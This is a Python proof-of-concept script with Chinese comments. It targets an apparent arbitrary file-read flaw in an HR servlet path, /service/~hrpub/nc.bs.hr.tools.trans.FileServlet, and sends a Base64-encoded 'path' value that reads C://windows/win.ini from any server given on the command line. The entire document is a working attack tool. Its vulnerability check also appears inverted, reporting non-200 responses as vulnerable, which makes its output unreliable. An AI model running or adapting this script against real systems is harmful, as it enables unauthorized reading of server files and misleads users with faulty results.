import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的GET请求。存在问题的路径为/service/~hrpub/nc.bs.hr.tools.trans.FileServlet，参数是path',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送get请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/service/~hrpub/nc.bs.hr.tools.trans.FileServlet"  # 移除末尾的斜杠
    else:
        url = args.url + "/service/~hrpub/nc.bs.hr.tools.trans.FileServlet"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close'
}

params = {
    'path': 'QzovL3dpbmRvd3Mvd2luLmluaQ=='
}

response = requests.get(url, headers=headers, params=params)
if response.status_code != 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)


